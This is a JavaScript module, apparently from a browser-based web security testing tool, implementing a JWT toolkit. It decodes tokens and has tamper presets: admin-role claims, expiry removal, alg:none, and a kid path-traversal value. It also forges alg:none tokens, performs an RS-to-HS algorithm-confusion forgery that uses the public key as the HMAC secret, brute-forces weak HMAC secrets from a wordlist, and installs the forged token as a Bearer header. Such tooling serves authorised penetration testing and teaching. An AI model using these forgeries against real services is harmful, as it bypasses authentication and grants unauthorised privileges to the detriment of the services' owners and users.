// JWT inspector + toolkit. Decode, tamper, sign (HMAC), verify, brute-force a
// weak secret, and apply a token — all entirely in the browser via Web Crypto.
// Nothing is ever sent anywhere.

import { $, $$, toast, copy } from './util.js';
import { state, save, identityHeaders } from './state.js';
import { populateSelect } from './identities.js';
import {
  algFamily, b64urlDecode, b64urlEncode, b64urlBytes,
  hmacSig, asymSign, asymVerify,
} from './jwt-crypto.js';

let bruteAbort = false;

export function initJwt() {
  $('#jwtBtn').addEventListener('click', () => { $('#jwtModal').hidden = false; });
  $('#closeJwt').addEventListener('click', () => ($('#jwtModal').hidden = true));
  $('#jwtInput').addEventListener('input', decode);
  $('#jwtLoadActive').addEventListener('click', loadActive);
  $('#jwtForgeNone').addEventListener('click', forgeNone);
  $('#jwtCopy').addEventListener('click', () => copy(($('#jwtInput').value || '').trim()));

  // Presets
  $$('#jwtPresets [data-preset]').forEach((b) =>
    b.addEventListener('click', () => applyPreset(b.dataset.preset))
  );
  // Sign / verify
  $('#jwtSign').addEventListener('click', signCurrent);
  $('#jwtVerify').addEventListener('click', verifyCurrent);
  $('#jwtRsToHs').addEventListener('click', forgeRsToHs);
  $('#jwtAlg').addEventListener('change', updateKeyFields);
  updateKeyFields();
  // Brute-force
  $('#jwtWordlistBtn').addEventListener('click', () => $('#jwtWordlistFile').click());
  $('#jwtWordlistFile').addEventListener('change', loadWordlistFile);
  $('#jwtBrute').addEventListener('click', bruteForce);
  $('#jwtBruteStop').addEventListener('click', () => { bruteAbort = true; });
  // Apply
  $('#jwtApplyIdentity').addEventListener('click', applyToIdentity);
  $('#jwtCopyHeader').addEventListener('click', () => {
    const t = ($('#jwtInput').value || '').trim();
    if (!t) return toast('No token', true);
    copy('Authorization: Bearer ' + t);
  });
}

// ---- decode ------------------------------------------------------------

function decode() {
  const token = $('#jwtInput').value.trim();
  $('#jwtMeta').textContent = '';
  if (!token) {
    $('#jwtHeader').value = '';
    $('#jwtPayload').value = '';
    return;
  }
  const parts = token.replace(/^Bearer\s+/i, '').split('.');
  if (parts.length < 2) {
    $('#jwtMeta').textContent = 'Not a JWT (need header.payload.signature).';
    return;
  }
  try {
    const header = JSON.parse(b64urlDecode(parts[0]));
    const payload = JSON.parse(b64urlDecode(parts[1]));
    $('#jwtHeader').value = JSON.stringify(header, null, 2);
    $('#jwtPayload').value = JSON.stringify(payload, null, 2);
    renderMeta(header, payload);
  } catch (e) {
    $('#jwtMeta').textContent = 'Decode failed: ' + e.message;
  }
}

function renderMeta(header, payload) {
  const bits = [`alg: ${header.alg}`];
  if (payload.exp) {
    const d = new Date(payload.exp * 1000);
    bits.push(`exp: ${d.toISOString()}${d < new Date() ? ' (EXPIRED)' : ''}`);
  }
  if (payload.iat) bits.push(`iat: ${new Date(payload.iat * 1000).toISOString()}`);
  for (const k of ['sub', 'role', 'roles', 'scope', 'scopes', 'admin', 'isAdmin', 'aud']) {
    if (payload[k] !== undefined) bits.push(`${k}: ${JSON.stringify(payload[k])}`);
  }
  if (header.alg && header.alg.toLowerCase() === 'none') bits.push('⚠ alg:none — unsigned');
  $('#jwtMeta').textContent = bits.join('  ·  ');
}

function loadActive() {
  const headers = identityHeaders();
  const authKey = Object.keys(headers).find((k) => k.toLowerCase() === 'authorization');
  const val = authKey ? headers[authKey] : null;
  if (!val) return toast('Active identity has no Authorization header', true);
  $('#jwtInput').value = String(val).replace(/^Bearer\s+/i, '');
  decode();
}

// ---- header/payload helpers -------------------------------------------

function readHeaderPayload() {
  try {
    return {
      header: JSON.parse($('#jwtHeader').value || '{}'),
      payload: JSON.parse($('#jwtPayload').value || '{}'),
    };
  } catch {
    toast('Header/payload is not valid JSON', true);
    return null;
  }
}

function writeHeaderPayload(header, payload) {
  $('#jwtHeader').value = JSON.stringify(header, null, 2);
  $('#jwtPayload').value = JSON.stringify(payload, null, 2);
  renderMeta(header, payload);
}

function unsignedToken(header, payload) {
  return `${b64urlEncode(JSON.stringify(header))}.${b64urlEncode(JSON.stringify(payload))}.`;
}

// ---- presets -----------------------------------------------------------

function applyPreset(kind) {
  const hp = readHeaderPayload();
  if (!hp) return;
  const { header, payload } = hp;
  const now = Math.floor(Date.now() / 1000);
  switch (kind) {
    case 'role-admin': payload.role = 'admin'; break;
    case 'admin-true': payload.admin = true; payload.isAdmin = true; break;
    case 'bump-exp': payload.exp = now + 31536000; break;
    case 'remove-exp': delete payload.exp; break;
    case 'sub-1': payload.sub = 1; break;
    case 'alg-none': header.alg = 'none'; break;
    case 'alg-hs256': header.alg = 'HS256'; break;
    case 'kid-traversal': header.kid = '../../../../../../dev/null'; break;
  }
  writeHeaderPayload(header, payload);
  toast('Applied preset: ' + kind);
}

// ---- sign / verify (HMAC) ---------------------------------------------

async function signCurrent() {
  const hp = readHeaderPayload();
  if (!hp) return;
  const alg = $('#jwtAlg').value;
  hp.header.alg = alg;
  const signingInput = `${b64urlEncode(JSON.stringify(hp.header))}.${b64urlEncode(JSON.stringify(hp.payload))}`;
  try {
    const fam = algFamily(alg);
    const sig = fam === 'HMAC'
      ? await hmacSig($('#jwtSecret').value, alg, signingInput)
      : await asymSign(alg, signingInput, $('#jwtKey').value);
    $('#jwtInput').value = `${signingInput}.${sig}`;
    decode();
    setResult('#jwtSignResult', `signed (${alg})`, 'ok');
  } catch (e) {
    setResult('#jwtSignResult', e.message, 'bad');
  }
}

async function verifyCurrent() {
  const token = ($('#jwtInput').value || '').trim().replace(/^Bearer\s+/i, '');
  const parts = token.split('.');
  if (parts.length < 3 || !parts[2]) return setResult('#jwtSignResult', 'no signature to verify', 'bad');
  let alg;
  try { alg = JSON.parse(b64urlDecode(parts[0])).alg; } catch { return setResult('#jwtSignResult', 'bad header', 'bad'); }
  const fam = algFamily(alg);
  if (!fam) return setResult('#jwtSignResult', `alg ${alg} is not supported`, 'bad');
  try {
    const signingInput = `${parts[0]}.${parts[1]}`;
    const ok = fam === 'HMAC'
      ? (await hmacSig($('#jwtSecret').value, alg, signingInput)) === parts[2]
      : await asymVerify(alg, signingInput, parts[2], $('#jwtKey').value);
    setResult('#jwtSignResult', ok ? '✓ signature valid' : '✗ signature invalid', ok ? 'ok' : 'bad');
  } catch (e) {
    setResult('#jwtSignResult', e.message, 'bad');
  }
}

// RS→HS algorithm-confusion forgery: sign the token as HS256 using the RSA
// PUBLIC key (PEM text) as the HMAC secret. Servers that pick the verify
// algorithm from the token header — and feed the public key in as the HMAC
// secret — will accept this forgery without the private key.
async function forgeRsToHs() {
  const hp = readHeaderPayload();
  if (!hp) return;
  const pubPem = $('#jwtKey').value;
  if (!/-----BEGIN/.test(pubPem)) return setResult('#jwtSignResult', 'paste the RSA PUBLIC key (PEM) in the key box first', 'bad');
  hp.header.alg = 'HS256';
  const signingInput = `${b64urlEncode(JSON.stringify(hp.header))}.${b64urlEncode(JSON.stringify(hp.payload))}`;
  try {
    const sig = await hmacSig(pubPem, 'HS256', signingInput);
    $('#jwtInput').value = `${signingInput}.${sig}`;
    decode();
    setResult('#jwtSignResult', 'forged HS256 using public key as secret — match the server\'s exact key bytes', 'ok');
  } catch (e) {
    setResult('#jwtSignResult', e.message, 'bad');
  }
}

// ---- brute-force -------------------------------------------------------

function loadWordlistFile(e) {
  const file = e.target.files[0];
  if (!file) return;
  const reader = new FileReader();
  reader.onload = () => { $('#jwtWordlist').value = reader.result; toast('Wordlist loaded'); };
  reader.readAsText(file);
}

async function bruteForce() {
  const token = ($('#jwtInput').value || '').trim().replace(/^Bearer\s+/i, '');
  const parts = token.split('.');
  if (parts.length < 3 || !parts[2]) return setResult('#jwtBruteResult', 'paste a signed HS* token first', 'bad');
  let alg;
  try { alg = JSON.parse(b64urlDecode(parts[0])).alg; } catch { return setResult('#jwtBruteResult', 'bad header', 'bad'); }
  if (algFamily(alg) !== 'HMAC') return setResult('#jwtBruteResult', `alg ${alg} is not HMAC — can't brute`, 'bad');

  const words = $('#jwtWordlist').value.split('\n').map((w) => w.replace(/\r$/, '')).filter((w) => w.length);
  if (!words.length) return setResult('#jwtBruteResult', 'add a wordlist first', 'bad');

  const signingInput = `${parts[0]}.${parts[1]}`;
  const target = parts[2];
  bruteAbort = false;
  $('#jwtBrute').disabled = true;
  $('#jwtBruteStop').disabled = false;

  let found = null;
  for (let i = 0; i < words.length; i++) {
    if (bruteAbort) break;
    if (await hmacSig(words[i], alg, signingInput) === target) { found = words[i]; break; }
    if (i % 200 === 0) {
      setResult('#jwtBruteResult', `trying… ${i}/${words.length}`, '');
      await new Promise((r) => setTimeout(r, 0)); // yield to keep UI live
    }
  }
  $('#jwtBrute').disabled = false;
  $('#jwtBruteStop').disabled = true;
  if (found != null) {
    $('#jwtSecret').value = found;
    setResult('#jwtBruteResult', `✓ secret found: "${found}"`, 'ok');
    toast('Secret cracked: ' + found);
  } else {
    setResult('#jwtBruteResult', bruteAbort ? 'stopped' : `no match in ${words.length} candidates`, 'bad');
  }
}

// ---- apply -------------------------------------------------------------

function applyToIdentity() {
  const token = ($('#jwtInput').value || '').trim().replace(/^Bearer\s+/i, '');
  if (!token) return toast('No token', true);
  const id = state.identities.find((i) => i.name === state.activeIdentity);
  if (!id) return toast('Select an active identity first', true);
  const lines = (id.headers || '').split('\n').filter((l) => l.trim() && !/^\s*authorization\s*:/i.test(l));
  lines.push('Authorization: Bearer ' + token);
  id.headers = lines.join('\n');
  save();
  populateSelect();
  toast(`Bearer set on identity "${id.name}"`);
}

// ---- forge alg:none ----------------------------------------------------

function forgeNone() {
  const hp = readHeaderPayload();
  if (!hp) return;
  hp.header.alg = 'none';
  const token = unsignedToken(hp.header, hp.payload);
  $('#jwtInput').value = token;
  decode();
  copy(token);
  toast('alg:none token forged & copied');
}

// Show the HMAC secret box for HS*, the PEM key box for RS*/ES*.
function updateKeyFields() {
  const hmac = algFamily($('#jwtAlg').value) === 'HMAC';
  $('#jwtSecret').hidden = !hmac;
  const keyWrap = $('#jwtKeyWrap');
  if (keyWrap) keyWrap.hidden = hmac;
}

function setResult(sel, text, cls) {
  const el = $(sel);
  el.textContent = text;
  el.className = 'jwt-result' + (cls ? ' ' + cls : '');
}
